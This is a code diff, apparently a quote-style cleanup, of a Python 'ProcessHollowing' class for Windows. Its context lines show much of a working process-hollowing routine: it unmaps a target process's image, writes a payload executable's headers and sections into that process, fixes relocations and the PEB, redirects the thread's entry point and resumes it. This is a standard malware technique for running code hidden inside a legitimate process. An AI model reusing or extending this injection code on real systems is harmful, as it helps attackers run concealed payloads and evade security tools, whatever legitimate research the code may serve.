@@ -62,7 +62,7 @@ class ProcessHollowing(BaseWindowsPatcher):
 
     def get_required_libraries(self) -> list:
         """Get list of required Windows libraries for this patcher."""
-        return ['kernel32', 'ntdll']
+        return ["kernel32", "ntdll"]
 
     def hollow_process(self, target_exe: str, payload_path: str) -> bool:
         """
@@ -77,7 +77,7 @@ class ProcessHollowing(BaseWindowsPatcher):
         """
         try:
             # Read payload
-            with open(payload_path, 'rb') as f:
+            with open(payload_path, "rb") as f:
                 payload_data = f.read()
 
             # Parse payload PE
@@ -93,7 +93,7 @@ class ProcessHollowing(BaseWindowsPatcher):
                 # Get image base from PEB
                 peb_addr = self._get_peb_address_from_context(context)
                 image_base = self._read_image_base_from_peb(
-                    process_info['process_handle'],
+                    process_info["process_handle"],
                     peb_addr
                 )
 
@@ -104,18 +104,18 @@ class ProcessHollowing(BaseWindowsPatcher):
                 logger.info(f"Target image base: {hex(image_base)}")
 
                 # Unmap original executable
-                if not self._unmap_view_of_section(process_info['process_handle'], image_base):
+                if not self._unmap_view_of_section(process_info["process_handle"], image_base):
                     logger.warning("Failed to unmap original section")
 
                 # Allocate memory for payload
-                payload_base = getattr(payload_pe.OPTIONAL_HEADER, 'ImageBase', 0x400000)
-                payload_size = getattr(payload_pe.OPTIONAL_HEADER, 'SizeOfImage', 0)
+                payload_base = getattr(payload_pe.OPTIONAL_HEADER, "ImageBase", 0x400000)
+                payload_size = getattr(payload_pe.OPTIONAL_HEADER, "SizeOfImage", 0)
                 if not payload_size:
                     logger.error("Failed to get SizeOfImage from payload PE header")
                     return False
 
                 allocated_base = self._allocate_memory(
-                    process_info['process_handle'],
+                    process_info["process_handle"],
                     payload_base,
                     payload_size
                 )
@@ -123,7 +123,7 @@ class ProcessHollowing(BaseWindowsPatcher):
                 if not allocated_base:
                     # Try alternative address
                     allocated_base = self._allocate_memory(
-                        process_info['process_handle'],
+                        process_info["process_handle"],
                         image_base,
                         payload_size
                     )
@@ -136,7 +136,7 @@ class ProcessHollowing(BaseWindowsPatcher):
 
                 # Write payload headers
                 if not self._write_headers(
-                    process_info['process_handle'],
+                    process_info["process_handle"],
                     allocated_base,
                     payload_data,
                     payload_pe
@@ -146,7 +146,7 @@ class ProcessHollowing(BaseWindowsPatcher):
 
                 # Write payload sections
                 if not self._write_sections(
-                    process_info['process_handle'],
+                    process_info["process_handle"],
                     allocated_base,
                     payload_data,
                     payload_pe
@@ -157,7 +157,7 @@ class ProcessHollowing(BaseWindowsPatcher):
                 # Process relocations if needed
                 if allocated_base != payload_base:
                     if not self._process_relocations(
-                        process_info['process_handle'],
+                        process_info["process_handle"],
                         allocated_base,
                         payload_pe
                     ):
@@ -165,7 +165,7 @@ class ProcessHollowing(BaseWindowsPatcher):
                         return False
 
                 # Update entry point in context
-                entry_point_offset = getattr(payload_pe.OPTIONAL_HEADER, 'AddressOfEntryPoint', 0)
+                entry_point_offset = getattr(payload_pe.OPTIONAL_HEADER, "AddressOfEntryPoint", 0)
                 if not entry_point_offset:
                     logger.error("Failed to get AddressOfEntryPoint from payload PE header")
                     return False
@@ -178,18 +178,18 @@ class ProcessHollowing(BaseWindowsPatcher):
 
                 # Update image base in PEB
                 self._write_image_base_to_peb(
-                    process_info['process_handle'],
+                    process_info["process_handle"],
                     peb_addr,
                     allocated_base
                 )
 
                 # Set thread context
-                if not self._set_thread_context(process_info['thread_handle'], context):
+                if not self._set_thread_context(process_info["thread_handle"], context):
                     logger.error("Failed to set thread context")
                     return False
 
                 # Resume thread
-                self.kernel32.ResumeThread(process_info['thread_handle'])
+                self.kernel32.ResumeThread(process_info["thread_handle"])
 
                 logger.info("Process hollowing successful")
                 return True
@@ -386,7 +386,7 @@ class ProcessHollowing(BaseWindowsPatcher):
                            payload_pe: Any) -> bool:
         """Process PE relocations for new base address"""
         try:
-            if not hasattr(payload_pe, 'DIRECTORY_ENTRY_BASERELOC'):
+            if not hasattr(payload_pe, "DIRECTORY_ENTRY_BASERELOC"):
                 return True  # No relocations needed
 
             delta = new_base - payload_pe.OPTIONAL_HEADER.ImageBase
@@ -419,7 +419,7 @@ class ProcessHollowing(BaseWindowsPatcher):
 
                     # Apply relocation
                     new_value = current.value + delta
-                    new_bytes = struct.pack('<Q' if size == 8 else '<I', new_value)
+                    new_bytes = struct.pack("<Q" if size == 8 else "<I", new_value)
 
                     bytes_written = ctypes.c_size_t(0)
                     self.kernel32.WriteProcessMemory(
